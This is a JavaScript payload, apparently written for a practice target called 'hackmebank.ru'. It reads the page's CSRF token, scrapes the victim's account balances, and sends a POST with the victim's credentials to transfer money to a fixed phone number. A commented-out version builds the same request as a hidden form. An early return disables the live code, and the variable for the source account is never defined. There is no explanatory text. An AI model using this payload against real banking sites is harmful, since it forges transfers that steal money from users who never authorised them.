// let x = document.createElement('form')
// x.action="/index.php?r=personal%2Fphone-transfer&account_from=90107430600220100631"
//
// let y = document.createElement('input')
// y.name="_csrf";
// y.type="hidden"
//
// let csrf = document.querySelectorAll('meta')[3].getAttribute('content');
//
// y.value=csrf;
// let z = document.createElement('input')
// z.name="PhoneTransferForm[phone]"
// z.value = '+79157442031'
//
// let q = document.createElement('input')
// q.name = 'PhoneTransferForm[amount]'
//
(function () {
    console.log(123);return;
    let accountFromRu = '90107430600220100601';
    let accountFrom$ = '90107430600220100602';
    let accountFromEur = '90107430600220100603';

    let csrf = document.querySelectorAll('meta')[3].content;
    let balance = document.querySelectorAll('#balances > li');
    let rub = balance[0].innerText.split(' ')[0];
    let $$ = balance[1].innerText.split(' ')[0];
    let eur = balance[2].innerText.split(' ')[0];

    fetch(`https://hackmebank.ru/index.php?r=personal%2Fphone-transfer&account_from=${accountFrom}`, {
        "headers": {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en,ru-RU;q=0.9,ru;q=0.8,en-US;q=0.7",
            "cache-control": "no-cache",
            "content-type": "application/x-www-form-urlencoded",
            "pragma": "no-cache",
            "sec-ch-ua": "\" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"97\", \"Chromium\";v=\"97\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"macOS\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1"
        },
        "referrer": `https://hackmebank.ru/index.php?r=personal%2Fphone-transfer&account_from=${accountFrom}`,
        "referrerPolicy": "strict-origin-when-cross-origin",
        "body": `_csrf=${csrf}&PhoneTransferForm%5Baccount_from_number%5D=${accountFrom}&PhoneTransferForm%5Bphone%5D=%2B79157442031&PhoneTransferForm%5Bamount%5D=0.02&PhoneTransferForm%5Bcomment%5D=`,
        "method": "POST",
        "mode": "cors",
        "credentials": "include"
    });
})()
